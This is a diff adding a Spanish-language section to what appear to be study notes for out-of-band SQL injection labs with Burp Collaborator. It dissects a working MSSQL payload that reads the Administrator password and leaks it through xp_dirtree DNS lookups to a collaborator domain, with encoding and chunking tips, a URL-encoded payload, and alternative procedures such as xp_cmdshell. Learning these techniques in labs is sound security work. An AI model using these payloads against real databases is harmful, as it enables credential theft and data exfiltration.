@@ -124,6 +124,109 @@ Aquí se envía un hash (reduce tamaño y evita caracteres problemáticos).
 
 ---
 
+## Idea general
+
+Cerrar la comilla, declarar una variable, asignarle el valor que queremos leer de la BD, y ejecutar dinámicamente un procedimiento extendido (`xp_dirtree`) pasando una ruta UNC cuyo host contiene ese valor; al intentar acceder a esa ruta, la red intenta resolver el nombre de host y la resolución (DNS/SMB) llega a un servidor controlado por el atacante, que así recibe el dato exfiltrado.
+
+---
+
+## Desglose paso a paso
+
+Tomamos el payload y lo explicamos en bloques.
+
+### `';`
+
+* **Cierra** la comilla que la aplicación dejó abierta al insertar tu input (si la app hacía `WHERE id = '<input>'`). Así evitas que la comilla sobrante rompa la sintaxis.
+* El `'` cierra la cadena; el `;` separa sentencias T‑SQL.
+
+### `DECLARE @p varchar(1024);`
+
+* Declara una variable local `@p` para almacenar texto (hasta 1024 caracteres). Usamos una variable para poder manipular y luego concatenar el dato en una cadena que pasaremos a `EXEC`.
+
+### `SET @p=(SELECT password FROM users WHERE username='Administrator');`
+
+* La subconsulta lee la **contraseña** del usuario `Administrator` y la asigna a `@p`.
+* **IMPORTANTE:** si la subconsulta devuelve más de una fila habrá error; por eso en entornos reales se usa `TOP 1`, `LIMIT`, o `ROWNUM=1` según SGBD.
+
+### `exec('master..xp_dirtree "//'+@p+'.abc123.burpcollaborator.net/a"')`
+
+* `exec(...)` ejecuta dinámicamente una cadena T‑SQL construida en tiempo de ejecución. Aquí la cadena contiene la llamada a `master..xp_dirtree` con una ruta UNC.
+* `master..xp_dirtree` es un **procedimiento extendido** que lista directorios en una ruta UNC. Al pasársele `//host/share` o `\\host\share` intenta acceder a ese host.
+* La cadena `"//'+@p+'.abc123.burpcollaborator.net/a"` concatena (en tiempo de ejecución) el contenido de `@p` dentro del nombre del host de la ruta UNC: el host resultante será `s3curePwd.abc123.burpcollaborator.net` si `@p = 's3curePwd'`.
+* Al intentar acceder a esa ruta, la máquina objetivo **resuelve** `s3curePwd.abc123.burpcollaborator.net` → consulta DNS que queda registrada en el servidor autoritativo (p. ej. Burp Collaborator).
+
+### `--`
+
+* Comentario que descarta el resto de la consulta original y evita que comillas o SQL extra provoquen errores de sintaxis.
+
+---
+
+## Por qué esto *exfiltra* datos
+
+* En vez de devolver la contraseña en la respuesta HTTP, la inyectamos en el **subdominio** de la ruta UNC. El entorno objetivo tiene que resolver ese nombre y, como consecuencia, la resolución DNS sale de la red (egress) y llega al servidor del atacante, donde el dato aparece en el subdominio.
+* Es una técnica out‑of‑band (OAST) — muy útil cuando la aplicación no devuelve datos ni errores.
+
+---
+
+## Requisitos y permisos
+
+* `xp_dirtree` y `xp_cmdshell` suelen requerir **permisos elevados** (por ejemplo `sysadmin`). En muchas instalaciones están **deshabilitados** por seguridad.
+* La red debe permitir **egress DNS** o que la resolución provoque una petición hacia el dominio controlado por el atacante. Si la red bloquea DNS saliente o usa un resolver que no egress, no funcionará.
+* El servidor SQL debe poder realizar la operación de red (algunas políticas de grupo/ACLs lo impiden).
+
+---
+
+## Limitaciones prácticas
+
+* **Longitud de host:** los labels DNS tienen máximo ~63 bytes y el dominio total ~253 bytes, por lo que hay que fragmentar y codificar datos largos.
+* **Carácteres inválidos:** contraseñas pueden contener caracteres no válidos en hostnames (espacios, @, /). Es recomendable **codificar/hexificar/base32** el dato antes de usarlo en el host.
+* **Detección:** llamadas a `xp_*` y resoluciones extrañas son ruidosas y suelen activan IDS/WAF/logging.
+* **Privilegios:** sin privilegios no se puede ejecutar `xp_dirtree` ni `xp_cmdshell` o `EXEC` dinámico.
+
+---
+
+## Cómo adaptar / robustecer (labs)
+
+* **Asegurar una sola fila:** usar `TOP 1` (MSSQL): `SET @p=(SELECT TOP 1 password FROM users WHERE username='Administrator');`
+* **Codificar dato:** usar `master..fn_varbintohexstr` o `CONVERT` para hexificar antes de concatenar, o calcular un hash para reducir longitud y caracteres:
+
+  ```sql
+  SET @p = (SELECT CONVERT(varchar(200), HASHBYTES('MD5', (SELECT TOP 1 password FROM users WHERE username='Administrator')),2));
+  ```
+* **Fragmentar:** si el dato es largo, enviar en trozos: `...xp_dirtree '//part1.part2.<UNIQUE>.collab.net/a'` en varias peticiones.
+
+---
+
+## Ejemplo URL‑encoded (para Burp/cookie)
+
+Payload simple (sin exfiltrar valor):
+
+```
+'; exec master..xp_dirtree '//abc123.collaborator.net/a'--
+```
+
+URL-encoded:
+
+```
+%27%3B%20exec%20master..xp_dirtree%20%27%2F%2Fabc123.collaborator.net%2Fa%27--
+```
+
+---
+
+## Alternativas y equivalentes
+
+* `xp_fileexist '\\host\share'` — también fuerza resolución.
+* `xp_subdirs` — similar a `xp_dirtree`.
+* `xp_cmdshell 'nslookup host'` — si está habilitado permite ejecutar `nslookup` (más ruidoso).
+* En otros SGBD: Oracle (`UTL_HTTP`, `UTL_INADDR`), PostgreSQL (`COPY TO PROGRAM`, extensiones) permiten OAST si tienen privilegios.
+
+
+
+---
+
+
+---
+
 ## Práctica en Burp Collaborator
 
 1. Generá un nuevo payload OAST en Collaborator o usa el cliente integrado en Burp.
